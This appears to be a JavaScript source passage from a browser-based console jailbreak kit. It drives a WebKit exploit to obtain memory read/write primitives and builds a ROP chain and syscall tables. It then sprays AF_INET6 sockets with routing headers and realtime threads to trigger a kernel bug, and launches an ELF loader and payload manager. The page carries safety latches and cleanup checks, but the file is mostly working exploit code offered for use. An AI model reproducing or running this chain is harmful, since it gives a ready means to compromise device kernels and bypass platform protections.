    flushMark("POOPS-COMPLETE", "pass=" + passed + "-fail=" + failed
        + "-skip=" + skipped + "-reboot=" + (mustReboot ? 1 : 0)
        + "-triggered=" + (engine && engine.triggered ? 1 : 0)
        + "-rtmean=" + rtMean + "-filtered=" + (FILTERED_RUN ? 1 : 0));

    const payloadSuccess = cfg.payload === "1" && elfldrSpawned;
    const fullSuccess = payloadSuccess || (failed === 0 && !aborted
        && !FILTERED_RUN && !chainDead && !state.cleanupFailed);

    if (fullSuccess) {
        clearFailureBanners();
        setCatResult(true);
        showVerdict(false, payloadSuccess
            ? "ELF LOADER READY -- returning to the payload menu."
            : "SUCCESS -- all executed checks passed."
                + (mustReboot
                    ? "\n\nThe jailbreak changed this boot's kernel state; reboot before running it again."
                    : "\n\nCleanup completed and the run may be repeated safely."));
    } else if (mustReboot) {
        setCatResult(false);
        showVerdict(true, (v ? v.text : "reboot now -- the state report and "
            + "cleanup row (PS7) never ran"
            + (chainDead ? ", because the ROP chain died at '" + chainDead
                + "'"
                : ", so nothing has been verified and this page cannot claim "
                + "anything was put back."))
            + "\n\nREBOOT NOW"
            + (v && v.all.length > 1
                ? "\n\nAll reasons:\n  - " + v.all.join("\n  - ") : ""));
    } else {

        const ver = (v && v.verified) || {};
        setCatResult(false);
        showVerdict(false, "you are fine -- nothing was triggered and " + "everything this page can check was put back.\n"
            + (ver.teardown ? "freed and closed socket by socket"
                : "teardown had nothing to do")
            + "; racers " + (ver.racers ? "confirmed exited" : "NOT confirmed")
            + "; scheduler affinity "
            + (ver.schedAff ? "read back" : "NOT read back")
            + " and priority " + (ver.schedPrio ? "read back" : "NOT read back")
            + "; descriptors left open on purpose: " + stranded.length
            + "; kernel writes: " + (ver.kernelWrites === undefined
                ? "0" : ver.kernelWrites) + ".");
    }

    const finalLatch = await latch.read();
    if (!mustReboot && !failed && !aborted && !FILTERED_RUN && !stranded.length
        && !chainDead && !state.cleanupFailed) {
        const l = await latch.clear();
        flushMark("LATCH-RELEASED", "set=" + (l.set ? 1 : 0));
        lines.push("one-shot latch RELEASED: this run put everything back and "
            + "verified it.");
    } else {
        flushMark("LATCH-HELD", "reboot=" + mustReboot + "-failed=" + failed
            + "-aborted=" + (aborted || "no") + "-filtered=" + FILTERED_RUN);
        lines.push("ONE-shot latch still held"
            + (finalLatch.set ? "" : " (or never took)")
            + "");
    }
    summaryEl.textContent = lines.join("\n");

    if (!aborted && !FILTERED_RUN) storeDel(PROGRESS_KEY);
    storeSet(RUNLOG_KEY, JSON.stringify({
        v: 1, rev: REV, ts: Date.now(),
        trigger: cfg.trigger, burn: cfg.burn,
        stoppedAt: aborted || "", filtered: FILTERED_RUN,
        pass: passed, fail: failed, skip: skipped,
        reboot: mustReboot,
        triggered: engine ? engine.triggered : "",
        corrupt: engine ? engine.corrupt : "",
        triplets: engine && engine.TW.tripletsValid()
            ? engine.TW.S.triplets.join(",") : "",
        setuidCalls: engine ? engine.S.setuidCalls : 0,
        socketsLeft: engine ? engine.TW.S.n : 0,
        chainDead: chainDead, cleanupFailed: state.cleanupFailed,
        latchDetail: (finalLatch && finalLatch.detail) || ""
    }));

    if (payloadSuccess)
        stage("ELF LOADER READY -- opening payload menu", "ok");
    else if (fullSuccess)
        stage("SUCCESS -- " + passed + " PASS / 0 FAIL", "ok");
    else if (mustReboot)
        stage("reboot required -- " + passed + " PASS / " + failed + " FAIL", "bad");
    else if (failed || aborted)
        stage("FAILED -- " + passed + " PASS / " + failed + " FAIL", "bad");
    else
        stage("stages 0-2 complete, nothing triggered, everything put back -- "
            + passed + " PASS", "ok");

    if (payloadSuccess) {
        showPayloadMenu();
        if (AUTOLOAD_PAYLOAD_MANAGER) {
            flushMark("ELFLDR-AUTOLOAD-INPAGE",
                "name=pldmgr_v0.5.1.elf-port=9021-delay=3000ms");
            stage("PAYLOAD MANAGER IN 3 SECONDS", "ok");
            await new Promise(resolve => setTimeout(resolve, 3000));
            await autoloadPayload("pldmgr_v0.5.1.elf");
        } else {
            flushMark("ELFLDR-AUTOLOAD-SKIPPED", "operator-disabled");
            stage("SELECT A PAYLOAD", "ok");
        }
    }
}

async function bootChain() {
    const bootTimer = setTimeout(() => {
        flushMark("BOOT-STALLED", "ms=45000-stage=boot-nothing-changed-yet");
        stage("boot is taking more than 45 s");
    }, 45000);
    try {
        stage("preflight");
        await preflight();
        refuseReferenceChain();
        await bootPrimitiveAndChain();
    } finally {
        clearTimeout(bootTimer);
    }
}

async function bootPrimitiveAndChain() {
    if (globalThis.p && typeof globalThis.p.read8 === "function") {
        flushMark("PRIMITIVE-REUSED", "window.p was already published");
    } else if (typeof window.jbReady === "object" && window.jbReady !== null
        && typeof window.jbReady.then === "function") {
        stage("waiting for the primitive");
        await window.jbReady;
        flushMark("PRIMITIVE-REUSED", "via-window.jbReady");
    } else if (typeof window.run_slopkit === "function") {
        stage("running slopkit's deserializer bug through window.run_slopkit");
        await window.run_slopkit(window.fw_str);
        flushMark("PRIMITIVE-REUSED", "via-window.run_slopkit");
    } else {
        stage("running the webkit bug -- placement is ~1 attempt in 3, it "
            + "retries itself");

        // A killed/reloaded WebProcess can restore this history entry with the
        // previous 65k-object SerializedScriptValue graph still attached.  If
        // we build the next graph before releasing it, 9.00 can hit its memory
        // ceiling almost immediately.  Purge it before any exploit allocation.
        flushMark("PRIMITIVE-HISTORY-PURGE-PRE", "replace-state-null");
        try {
            history.replaceState(null, "");
        } catch (e) {
            flushMark("PRIMITIVE-HISTORY-PURGE-FAIL",
                (e && e.name ? e.name : "Error") + ":" + String(e && e.message || e));
            throw e;
        }
        if (typeof globalThis.gc === "function") {
            try { globalThis.gc(); } catch (e) { }
        }
        await new Promise(resolve => setTimeout(resolve, 750));
        flushMark("PRIMITIVE-HISTORY-PURGED", "settled-ms=750");

        const carrier = await establishPrimitive({
            maxAttempts: MAX_ATTEMPTS,
            onEvent(tag, detail, attempt) {
                if (tag === "ATTEMPT-START") {
                    // This is before the large graph is built, so make the
                    // checkpoint durable if the WebProcess dies during setup.
                    flushMark(tag, detail);
                    stage("exploit attempt " + attempt + " -- waiting for placement");
                } else {
                    queueEvent(tag, detail);
                }
            },
            beforeCriticalLoad(fake, target) {
                queueEvent("CRITICAL-LOAD-NEXT", "fake=0x" + fake.toString(16)
                    + "-target=0x" + target.toString(16));
                void scrEl.offsetWidth;
                flushQueue(false);
            }
        });
        nogcHard.carrier = carrier;
        installWindowP(carrier, { onEvent: queueEvent });
        // installWindowP() promotes the primitive to a self-contained pair of
        // real typed arrays.  Keeping the obsolete fake carrier here defeats
        // core.js's release and can retain the 72 MB addrof carrier graph.
        nogcHard.carrier = null;
        if (typeof globalThis.gc === "function") {
            try { globalThis.gc(); } catch (e) { }
        }
        // Give JSC an idle turn to reclaim the released carrier/groom before
        // prepare() creates its worker ROP stack and the kernel-stage arenas.
        await new Promise(resolve => setTimeout(resolve, 1000));
        flushMark("PRIMITIVE-MEMORY-RELIEF",
            "fake-carrier-dropped=1-history-state-null="
            + (history.state === null));
        // The landing page preloads the small UI image so it remains visually
        // stable while this page transitions into its live log view.
        flushMark("PRIMITIVE-UP", "attempt=" + carrier.attempts
            + "-paired=" + pairStatus.promoted
            + "-released=" + fakeCellReleased());
        if (!pairStatus.promoted)
            throw new Error("the (main, worker) pair was NOT promoted ("
                + pairStatus.error + ")");
    }

    const p = globalThis.p;
    if (!p || typeof p.read8 !== "function")
        throw new Error("window.p was never published");
    nogcHard.p = p;
    assertInt64Identity();

    stage("loading poops_lib / threads_lib / twin_lib / poops_stages");
    await loadPoopsModules();

    const handoff = window.jbPrepared || null;
    let prepared;
    if (handoff && handoff.chain && handoff.p
        && typeof handoff.chain.syscall === "function"
        && handoff.p.syscalls !== undefined) {
        prepared = handoff;
        flushMark("CHAIN-REUSED", "window.jbPrepared");
    } else {
        stage("prepare(): module bases, gadget/syscall tables, worker hijack");
        flushMark("PREP-ENTER", "");
        prepared = await prepare(p);
        flushMark("PREP-OK", "getpid-passed-inside-prepare");
    }
    P = prepared.p;
    chain = prepared.chain;
    nogcHard.chain = chain;

    flushMark("POST-PREP", "next=assertBases");
    assertBases();
    await probeErrnoConvention();
}

async function main() {
    flushMark("POOPS-BOOT", "rev=" + REV + "-trigger=" + cfg.trigger
        + "-burn=" + cfg.burn + "-sockets=" + cfg.sockets
        + "-attempts=" + cfg.attempts + "-from=" + (FROM || "none")
        + "-only=" + (ONLY.join(".") || "none")
        + "-stalledAt=" + (STALLED_AT || "none"));
    lockNav(true);
    runInFlight = true;
    try {
        await bootChain();

        await chooseCore();

        makeContext();
        const self = await engine.H.thrSelf("driver");
        driver.tid = self.tid;
        const r0 = await engine.H.readRtprio("driver-original");
        driver.origPrioType = r0.type;
        driver.origPrio = r0.prio;
        const pid = await sys(0x014);
        driver.pid = pid.failed ? 0 : pid.s32;
        flushMark("DRIVER-IDENTITY", "pid=" + driver.pid + "-tid=" + driver.tid
            + "-mask=" + driver.origMaskHex + "-rtprio=" + driver.origPrioType
            + "/" + driver.origPrio + "-core=" + driver.core);

        flushMark("PRE-FD-BASELINE", "next=socket(AF_UNIX,SOCK_STREAM)");
        const first = await sys(0x061, K.AF_UNIX, K.SOCK_STREAM, 0);
        if (!first.failed) {
            state.fdBaseline = first.s32;
            await sys(0x006, state.fdBaseline);
        }
        flushMark("FD-BASELINE", "fd=" + state.fdBaseline);

        vitals(vitalsText("about to open "));
        cfgEl.textContent =
            "trigger: " + cfg.trigger
            + (cfg.trigger === "overflow" ? "   burn: " + cfg.burn : "")
            + "   |   stage-0 attempts: " + cfg.attempts
            + "   |   twin scan: " + (PK ? PK.MAX_ROUNDS_TWIN : 10)
            + " rounds at BATCH 1 (twin_lib REFUSES batch>1 once a trigger "
            + "exists)\n"
            + "spray bank: " + cfg.sockets + " AF_INET6 sockets x 360-byte "
            + "type-0 routing header (poops.c:38, :45)\n"
            + "target core " + driver.core + " -- " + driver.coreWhy + "\n"
            + "driver tid " + (driver.tid || "unknown") + " in pid " + driver.pid
            + "; will put back mask " + driver.origMaskHex + " and rtprio "
            + driver.origPrioType + "/" + driver.origPrio + "\n" + "chain watchdog " + WATCHDOG_MS + " ms per round trip; every loop " + "on this page is bounded by an iteration count AND a wall clock, " + "and every wait has a deadline.\n";

        stage("running the ladder -- one row at a time");
        try {
            await runLadder();
        } finally {
            if (chainDead)
                danger("cleanup impossible: the ROP chain died at '" + chainDead
                    + "'.\nUp to " + (engine ? engine.TW.S.n : 0) + " AF_INET6 "
                    + "sockets, their 360-byte kernel routing headers, twelve "
                    + "realtime kernel threads pinned to core " + driver.core
                    + ", and this WebProcess's raised fd limit are all still " + "live, and NOTHING in a later page load can reach a " + "descriptor or a thread in a process it does not own"
                    + (driver.tid
                        ? "\nThe driver thread is tid " + driver.tid + " in pid "
                        + driver.pid + " and that has been written down: a " + "later load CAN restore its affinity and priority by " + "explicit TID"
                        : "")
                    + "\nREBOOT.");
        }
    } finally {
        runInFlight = false;
        lockNav(false);
    }
}

async function clearMain() {
    const before = await latch.read();
    const after = await latch.clear();
    stage(before.set
        ? "one-shot latch CLEARED. It was set by: " + (before.detail || "?")
        : "the latch was not set; nothing to clear.", "ok");
    summaryEl.textContent =
        "before: " + JSON.stringify(before) + "\nafter:  " + JSON.stringify(after)
        + (ARMED ? "\n\n?go=1 was present on this URL and was IGNORED: ?clear=1 "
            + "is checked first and returns." : "")
        + "\n\nNOTHING else was done";
    renderNav(STALLED_AT, false);
}

function renderNav() {
    navEl.textContent = "";
    navEl.style.display = "none";
}

function lastRunText() {
    if (!LAST_RUN) return "";
    const age = Math.round((Date.now() - (LAST_RUN.ts || 0)) / 1000);
    return "\nLAST recorded run (" + age + " s ago, trigger=" + LAST_RUN.trigger
        + "): " + (LAST_RUN.stoppedAt ? "stopped at '" + LAST_RUN.stoppedAt + "'"
            : "completed")
        + ", " + LAST_RUN.pass + " pass / " + LAST_RUN.fail + " fail"
        + (LAST_RUN.reboot ? "\n  that run'S verdict was: REBOOT." : "")
        + (LAST_RUN.triggered ? "\n  the trigger fired: " + LAST_RUN.triggered
            : "")
        + (LAST_RUN.corrupt ? "\n  an alias was observed: " + LAST_RUN.corrupt
            : "")
        + (LAST_RUN.triplets ? "\n  triplet established: " + LAST_RUN.triplets
            : "")
        + (LAST_RUN.setuidCalls ? "\n  setuid(1) was called "
            + LAST_RUN.setuidCalls + " time(s) -- IRREVERSIBLE for that boot, "
            + "so the trigger's own precondition (a fresh, singly-referenced "
            + "cred) no longer holds in that WebProcess" : "")
        + (LAST_RUN.chainDead ? "\n  chain died at '" + LAST_RUN.chainDead + "'"
            : "")
        + (LAST_RUN.latchDetail ? "\n  latch detail recorded by that run: "
            + LAST_RUN.latchDetail : "");
}

(async function entry() {

    screenLine("slopkit -- reading the one-shot safety latch");

    if (CLEARLATCH) {
        renderNav("", false);
        await clearMain();
        return;
    }

    stage("checking the one-shot safety latch");
    const l = await latch.read();
    flushMark("LATCH-READ", "set=" + (l.set ? 1 : 0)
        + "-detail=" + clean(l.detail || ""));

    // ?auto=1 clears the latch instead of asking; reboot between runs
    if (l.set && AUTOCLEAR) {
        flushMark("LATCH-AUTOCLEAR", clean(l.detail || ""));
        await latch.clear();
        stage("latch was set and ?auto=1 cleared it, set by: "
            + (l.detail || "(no detail)")
            + "\nassumes the console has been rebooted since that run.");
        l.set = false;
    }

    if (l.set) {
        renderNav(STALLED_AT, true);
        stage("the one-shot latch is set, by: " + (l.detail || "(no detail)")
            + "\n\nre-arming is only safe after a run that failed in the " + "prologue: setuid(1) is irreversible for the boot and the trigger " + "needs a fresh singly-referenced cred");
        summaryEl.textContent = lastRunText();
        flushMark("POOPS-LATCHED", clean(l.detail || ""));
        return;
    }

    if (!ARMED) {
        document.getElementById("arm").hidden = false;
        renderNav(STALLED_AT, false);
        stage("not armed" + (STALLED_AT ? " -- and the last run stopped at '"
            + STALLED_AT + "'" : ""));
        vitals(vitalsText("if armed with ?go=1 this page will open "));

        if (cfg.trigger !== "none"
            && !(cfg.trigger === "overflow" && cfg.burn !== "full")) {
            showVerdict(true, "this selection will leave the console needing A " + "REBOOT.\n");
            navEl.textContent = "";
            link("?go=1&trigger=" + cfg.trigger
                + (cfg.trigger === "overflow" ? "&burn=" + cfg.burn : ""),
                "ARM  " + cfg.trigger.toUpperCase()
                + (cfg.trigger === "overflow" ? " / BURN=" + cfg.burn : "")
                + "  -- I accept that this console will need A REBOOT",
                "one hot");

            link("?trigger=none", "no -- go back to the negative control",
                "extra");
            link("../index.html", "back to slopkit", "extra");
        }
        summaryEl.textContent = lastRunText()
            + "\n\nSAME-process re-arm checks, and their limit stated honestly: " + "this page records the first socket fd it is given and the " + "process's uid, and can therefore notice that THIS WebProcess has " + "already run";
        flushMark("POOPS-IDLE", "rev=" + REV + "-armed=0-trigger=" + cfg.trigger);
        return;
    }

    if (STALLED_AT && !FROM && !ONLY.length) {

        renderNav(STALLED_AT, false);
        stage("the last run stopped at '" + STALLED_AT + "' but the latch is "
            + "clear, so pick a row explicitly", "bad");
        summaryEl.textContent = lastRunText();
        flushMark("POOPS-STALLED", STALLED_AT);
        return;
    }

    renderNav("", false);
    main().catch(err => {
        const m = (err && err.message) || String(err);
        stage("boot failed: " + m, "bad");
        flushMark("POOPS-FAILED", (err && err.name) + ":" + m.slice(0, 160));
        runInFlight = false;
        lockNav(false);
    });
})();
</script>
